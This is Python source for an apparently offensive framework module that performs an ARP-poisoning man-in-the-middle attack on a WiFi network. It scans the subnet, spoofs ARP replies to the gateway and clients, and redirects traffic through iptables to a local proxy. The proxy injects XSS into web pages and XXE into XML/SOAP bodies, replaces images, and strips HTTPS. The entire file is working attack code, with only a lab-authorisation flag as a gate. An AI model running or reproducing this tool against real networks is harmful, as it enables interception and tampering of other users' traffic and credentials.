class MITMHandler(BaseHTTPRequestHandler):
    """Transparent HTTP proxy request handler."""

    server_version = "nginx/1.22.0"
    sys_version = ""

    def log_message(self, fmt: str, *args) -> None:
        pass  # silent by default

    def _forward_request(self) -> None:
        """Forward request to real server and return (possibly modified) response."""
        global _REQUEST_COUNT
        host = self.headers.get("Host", "")
        path = self.path
        url = f"http://{host}{path}"

        # Read request body
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""

        # Inject XXE into XML request
        ct = self.headers.get("Content-Type", "")
        if "xml" in ct or "soap" in ct:
            body = _inject_into_xml(body)

        # Build connection to real server
        try:
            real_host = host.split(":")[0]
            real_port = int(host.split(":")[1]) if ":" in host else 80

            conn = socket.create_connection((real_host, real_port), timeout=15)
            # Rebuild and send request
            req_line = f"{self.command} {path} HTTP/1.1\r\n"
            headers_out = ""
            for k, v in self.headers.items():
                if k.lower() in ("proxy-connection", "transfer-encoding"):
                    continue
                headers_out += f"{k}: {v}\r\n"
            headers_out += f"Content-Length: {len(body)}\r\n" if body else ""
            headers_out += "\r\n"
            conn.sendall((req_line + headers_out).encode() + body)

            # Read response
            resp_data = b""
            conn.settimeout(10)
            while True:
                try:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    resp_data += chunk
                except TimeoutError:
                    break
            conn.close()

            if not resp_data:
                self._send_error(502)
                return

            # Parse response
            header_end = resp_data.find(b"\r\n\r\n")
            if header_end == -1:
                header_end = resp_data.find(b"\n\n")
                sep = b"\n\n"
            else:
                sep = b"\r\n\r\n"

            resp_headers_raw = resp_data[:header_end].decode("utf-8", errors="replace")
            resp_body = resp_data[header_end + len(sep):]
            resp_lines = resp_headers_raw.split("\r\n") if "\r\n" in resp_headers_raw else resp_headers_raw.split("\n")
            status_line = resp_lines[0]

            # Decompress if needed
            resp_headers_dict: dict[str, str] = {}
            for line in resp_lines[1:]:
                if ": " in line:
                    k, v = line.split(": ", 1)
                    resp_headers_dict[k.lower()] = v

            content_type = resp_headers_dict.get("content-type", "")
            content_enc = resp_headers_dict.get("content-encoding", "")

            # Decompress body
            if "gzip" in content_enc:
                try:
                    resp_body = gzip.decompress(resp_body)
                except Exception:
                    pass
            elif "deflate" in content_enc:
                try:
                    resp_body = zlib.decompress(resp_body)
                except Exception:
                    pass

            # Inject into HTML
            is_image = any(t in content_type for t in ("image/", "jpeg", "png", "gif", "webp"))
            is_html  = "html" in content_type
            is_xml   = any(t in content_type for t in ("xml", "soap"))

            if is_image and _REPLACE_IMAGES:
                resp_body = _BANNER_DATA
                content_type = "image/png"
                print_info(f"  [IMG] replaced image: {url}")
            elif is_html:
                resp_body = _inject_into_html(resp_body, url)
            elif is_xml:
                resp_body = _inject_into_xml(resp_body)

            # Rewrite Location header for SSL strip
            location = resp_headers_dict.get("location", "")
            if location.startswith("https://") and _SSL_STRIP:
                resp_headers_dict["location"] = location.replace("https://", "http://")

            # Extract status code
            status_parts = status_line.split(" ", 2)
            try:
                status_code = int(status_parts[1])
                status_msg  = status_parts[2] if len(status_parts) > 2 else "OK"
            except Exception:
                status_code, status_msg = 200, "OK"

            # Build and send response
            self.send_response(status_code, status_msg)
            skip = {"transfer-encoding", "content-encoding", "content-length",
                    "connection", "keep-alive"}
            for k, v in resp_headers_dict.items():
                if k.lower() not in skip:
                    self.send_header(k.title(), v)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(resp_body)))
            self.send_header("X-WXF-Intercepted", "1")
            self.end_headers()
            self.wfile.write(resp_body)

        except Exception as exc:
            logger.debug("Proxy forward error: %s", exc)
            self._send_error(502)

    def _serve_banner(self) -> None:
        """Serve the WXF replacement image."""
        self.send_response(200, "OK")
        self.send_header("Content-Type", "image/png")
        self.send_header("Content-Length", str(len(_BANNER_DATA)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(_BANNER_DATA)

    def _send_error(self, code: int) -> None:
        body = f"<h1>WXF Proxy Error {code}</h1>".encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:
        if self.path == "/wxf_banner" or self.path.startswith("/wxf_banner?"):
            self._serve_banner()
        else:
            self._forward_request()

    def do_POST(self) -> None:
        self._forward_request()

    def do_HEAD(self) -> None:
        self._forward_request()

    def do_CONNECT(self) -> None:
        """SSL strip: respond 200 then forward as plain HTTP."""
        if _SSL_STRIP:
            host_port = self.path
            try:
                real_host, real_port = host_port.split(":")
                real_port = int(real_port)
            except ValueError:
                real_host, real_port = host_port, 443

            self.send_response(200, "Connection established")
            self.end_headers()
            print_info(f"  [SSL-STRIP] CONNECT intercepted: {host_port}")

            # Tunnel raw data (pass-through without decryption for now)
            try:
                remote = socket.create_connection((real_host, real_port), timeout=15)
                self.connection.settimeout(15)
                remote.settimeout(15)
                while True:
                    r, _, _ = select.select([self.connection, remote], [], [], 5)
                    if not r:
                        break
                    for s in r:
                        data = s.recv(65536)
                        if not data:
                            return
                        other = remote if s is self.connection else self.connection
                        other.sendall(data)
            except Exception:
                pass
        else:
            self._send_error(405)


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


# ---------------------------------------------------------------------------
# WXF Exploit class
# ---------------------------------------------------------------------------

@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """ARP MITM Proxy — native WiFi MITM with HTTP injection.

    Puts this machine in MITM position on an existing WiFi network:
      1. ARP scan to discover gateway + clients
      2. ARP poison (continuous spoofed replies, no external arp-spoof binary)
      3. IP forwarding + iptables redirect port 80/443 to local proxy
      4. Transparent HTTP proxy with:
           - Image replacement (all images → chosen PNG)
           - XSS injection (<script>alert('WXF em execução')</script>)
           - XXE injection into XML/SOAP bodies
           - SSL stripping (https → http where possible)
      5. Clean up on stop

    Usage:
      set mode arp_mitm
      set interface wlp0s20f3
      set target_ip 192.168.1.5    (or 'all' for all clients)
      set banner_image /tmp/wxf_banner.png
      set duration 120
      run
    """

    __info__ = {
        "name": "ARP MITM Proxy (native)",
        "description": (
            "Transparent WiFi MITM via ARP poisoning + iptables redirect. "
            "Pure Python/Scapy — no bettercap, mitmproxy, or arpspoof. "
            "HTTP proxy injects XSS, XXE, replaces images, strips SSL. "
            "Works on any existing WiFi connection."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://en.wikipedia.org/wiki/ARP_spoofing",
            "https://owasp.org/www-community/attacks/Man-in-the-middle_attack",
        ),
        "devices": ("wifi", "network", "mitm", "proxy"),
    }

    mode         = OptString("arp_mitm", "Mode: arp_mitm | scan | status")
    interface    = OptString("wlp0s20f3", "Network interface already connected to target WiFi")
    target_ip    = OptString("all", "Target client IP, or 'all' for entire subnet")
    proxy_port   = OptInteger(8080, "HTTP proxy port")
    ssl_port     = OptInteger(8443, "HTTPS/SSL strip port")
    duration     = OptInteger(120, "Attack duration in seconds (0 = until Ctrl+C)")
    scan_timeout = OptInteger(5, "ARP scan timeout in seconds")
    inject_xss   = OptBool(True, "Inject XSS payload into HTML responses")
    inject_xxe   = OptBool(True, "Inject XXE probe into XML/SOAP bodies")
    replace_images = OptBool(True, "Replace all images with banner image")
    ssl_strip    = OptBool(True, "Strip HTTPS → HTTP in HTML and Location headers")
    banner_image = OptString("/tmp/wxf_banner.png", "Path to replacement image (PNG/JPG)")
    log_requests = OptBool(True, "Log intercepted requests to stdout")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    # ------------------------------------------------------------------

    def check(self) -> str:
        missing = [t for t in ("iptables", "sysctl", "ip") if not __import__("shutil").which(t)]
        if missing:
            return f"Missing tools: {', '.join(missing)}"
        try:
            from scapy.all import conf
        except ImportError:
            return "scapy not installed: pip install scapy"
        return "Prerequisites OK (iptables + sysctl + scapy)"

    def run(self) -> None:
        require_authorised_lab()
        op = str(self.mode).strip().lower()

        if op == "scan":
            self._do_scan()
        elif op == "status":
            self._do_status()
        elif op == "arp_mitm":
            self._do_mitm()
        else:
            print_error(f"Unknown mode {op!r}. Valid: arp_mitm | scan | status")

    # ------------------------------------------------------------------
    # scan
    # ------------------------------------------------------------------

    def _do_scan(self) -> None:
        iface = str(self.interface)
        ip, mac, cidr = _get_iface_info(iface)
        network = f"{'.'.join(ip.split('.')[:3])}.0/{cidr}"
        print_status(f"ARP scan on {iface} ({ip}/{cidr}) — subnet {network}")
        hosts = _arp_scan(network, iface, timeout=float(self.scan_timeout))
        gw_ip, gw_mac = _get_default_gateway(iface)
        print_success(f"Gateway: {gw_ip} ({gw_mac})")
        print_info(f"{'IP':<18} {'MAC':<20} {'NOTE'}")
        print_info("-" * 55)
        for (h_ip, h_mac) in sorted(hosts, key=lambda x: int(x[0].split(".")[-1])):
            note = "[GATEWAY]" if h_ip == gw_ip else ("[THIS MACHINE]" if h_ip == ip else "")
            print_info(f"  {h_ip:<18} {h_mac:<20} {note}")
        print_success(f"Found {len(hosts)} hosts")

    # ------------------------------------------------------------------
    # status
    # ------------------------------------------------------------------

    def _do_status(self) -> None:
        iface = str(self.interface)
        ip, mac, cidr = _get_iface_info(iface)
        fwd = open("/proc/sys/net/ipv4/ip_forward").read().strip()
        print_info(f"Interface:    {iface}")
        print_info(f"Our IP/MAC:   {ip} / {mac}")
        print_info(f"IP Forwarding: {'ENABLED ✓' if fwd == '1' else 'DISABLED'}")
        out = subprocess.run(["iptables", "-t", "nat", "-L", "PREROUTING", "-n"],
                              capture_output=True, text=True).stdout
        redirect_lines = [l for l in out.splitlines() if "REDIRECT" in l]
        print_info(f"iptables REDIRECT rules: {len(redirect_lines)}")
        for l in redirect_lines:
            print_info(f"  {l.strip()}")

    # ------------------------------------------------------------------
    # arp_mitm
    # ------------------------------------------------------------------

    def _do_mitm(self) -> None:
        global _BANNER_DATA, _BANNER_PATH, _INJECT_XSS, _INJECT_XXE
        global _REPLACE_IMAGES, _SSL_STRIP, _LOG_PATH

        iface    = str(self.interface)
        t_ip_opt = str(self.target_ip).strip()
        proxy_p  = int(self.proxy_port)
        ssl_p    = int(self.ssl_port)
        dur      = int(self.duration)

        _INJECT_XSS     = bool(self.inject_xss)
        _INJECT_XXE     = bool(self.inject_xxe)
        _REPLACE_IMAGES = bool(self.replace_images)
        _SSL_STRIP      = bool(self.ssl_strip)
        _BANNER_PATH    = str(self.banner_image)
        _BANNER_DATA    = _load_banner()

        # Discover network
        our_ip, our_mac, cidr = _get_iface_info(iface)
        gw_ip, gw_mac = _get_default_gateway(iface)
        network = f"{'.'.join(our_ip.split('.')[:3])}.0/{cidr}"

        print_status(f"Interface: {iface}  Our IP: {our_ip}  GW: {gw_ip}")
        print_status(f"ARP scanning {network} (timeout={self.scan_timeout}s)…")
        all_hosts = _arp_scan(network, iface, timeout=float(self.scan_timeout))

        # Select targets
        if t_ip_opt.lower() == "all":
            targets = [(h, m) for h, m in all_hosts if h not in (our_ip, gw_ip)]
        else:
            targets = [(h, m) for h, m in all_hosts if h == t_ip_opt]
            if not targets:
                # Try to resolve MAC
                mac = _arp_who_has(t_ip_opt, iface)
                if mac:
                    targets = [(t_ip_opt, mac)]
                else:
                    print_error(f"Could not resolve MAC for {t_ip_opt}. Is host online?")
                    return

        if not targets:
            print_warning("No active clients found. Starting proxy + iptables anyway.")
            print_info("Will intercept traffic from THIS machine and poison any new clients via dynamic ARP monitor.")

        print_success(f"Targets ({len(targets)}): {[t[0] for t in targets] or ['(none yet — monitoring)']}")
        print_success(f"Gateway: {gw_ip} ({gw_mac})")
        print_info(f"Proxy ports: HTTP={proxy_p} SSL={ssl_p}")
        print_info(f"Injections: XSS={_INJECT_XSS} XXE={_INJECT_XXE} IMG={_REPLACE_IMAGES} SSLSTRIP={_SSL_STRIP}")

        # Start HTTP proxy
        server = ThreadedHTTPServer(("0.0.0.0", proxy_p), MITMHandler)
        proxy_thread = threading.Thread(target=server.serve_forever, daemon=True, name="HTTPProxy")
        proxy_thread.start()
        print_success(f"HTTP proxy listening on :{proxy_p}")

        # Setup iptables
        setup_iptables(proxy_p, ssl_p, iface)

        # Start ARP poisoner
        poisoner = ARPPoisoner(iface, our_mac, our_ip, gw_ip, gw_mac, targets)
        poisoner.start()

        # Dynamic ARP monitor: add new clients as they appear
        def _dynamic_monitor():
            known = {t[0] for t in targets} | {our_ip, gw_ip}
            while not _stop_monitor.is_set():
                network_cur = f"{'.'.join(our_ip.split('.')[:3])}.0/{cidr}"
                new_hosts = _arp_scan(network_cur, iface, timeout=5.0)
                for h_ip, h_mac in new_hosts:
                    if h_ip not in known:
                        known.add(h_ip)
                        with _REQUEST_LOCK:
                            poisoner._targets.append((h_ip, h_mac))
                        print_success(f"  [+] New client detected: {h_ip} ({h_mac}) — added to ARP poison list")
                _stop_monitor.wait(15)

        _stop_monitor = threading.Event()
        mon_thread = threading.Thread(target=_dynamic_monitor, daemon=True, name="ARPMonitor")
        mon_thread.start()

        print_success("MITM active. Waiting for traffic…")
        print_info(f"Duration: {dur}s (0=infinite)  |  Ctrl+C to stop early")
        print_info("")
        print_info(f"  {'SOURCE':<18} {'DEST':<18} {'INFO'}")
        print_info(f"  {'-'*55}")

        try:
            end = time.time() + dur if dur > 0 else float("inf")
            while time.time() < end:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

        # Cleanup
        print_status("Stopping MITM…")
        _stop_monitor.set()
        poisoner.stop()
        server.shutdown()
        teardown_iptables(iface, proxy_p, ssl_p)
        with _REQUEST_LOCK:
            total = _REQUEST_COUNT
        print_success(f"MITM complete. Requests intercepted: {total}")
